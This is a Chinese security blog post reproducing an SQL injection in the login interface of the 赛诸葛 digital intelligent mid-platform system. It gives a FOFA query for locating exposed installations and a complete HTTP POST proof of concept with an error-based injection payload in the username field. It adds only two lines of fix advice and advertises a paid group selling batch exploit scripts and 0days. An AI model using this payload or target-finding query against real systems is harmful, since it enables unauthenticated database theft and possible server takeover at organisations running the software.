#  「漏洞复现」赛诸葛数字化智能中台系统 login SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-26 09:41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
赛诸葛数字化智能中台系统是一款为企业级客户提供数智化转型升级的软件产品，旨在帮助企业实现推广、销售到服务、管理全链条的打通，形成一体化闭环式服务。系统以赛诸葛平台为基础，涵盖了CRM（客户关系管理）、SCRM（社会化客户关系管理）、ERP（企业资源计划）、OA（办公自动化）、BI（商业智能）、MES（制造执行系统）等一系列产品。这些产品包含但不限于广告、获客、销售、客户、订单、生产、库存、合同、财务、审批、人事、培训等管理运营工具和技术服务。  
  
0x03  
  
漏洞威胁  
  
赛诸葛数字化智能中台系统 login 登录接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="static/index/image/login_left.png" || icon_hash="1056416905"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qpWt7E4AUXorEC6NUibWawAgr5JianMlI26iatup6ZiblGTUBpYJDVS6ibNqUFPjLmNTxYHkqEibEJkahQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: keep-alive

username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,version()))),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member=
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qpWt7E4AUXorEC6NUibWawAHRS087nPlvoPLXHfjRh3vWZMHTejib2KknZ8nIFyaOBiapM4GuCaxXTQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qpWt7E4AUXorEC6NUibWawAibMVjSy8vX2JgbyAJmAqr7K176E0Rwz0iaOgcvXnKqSlgvLIJNpwRtzQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qpWt7E4AUXorEC6NUibWawAIibbBNABDVvtzvRFv4xuvtZViaic7mUwvq3LsB81JtVdmzfn5400OXDqA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qpWt7E4AUXorEC6NUibWawA0I0cz5CXgY3uSW9klXLDDlEWBVqAs9257DXFDa4MaVicnIZjWLVCd4w/640?wx_fmt=gif&from=appmsg "")  
  
  
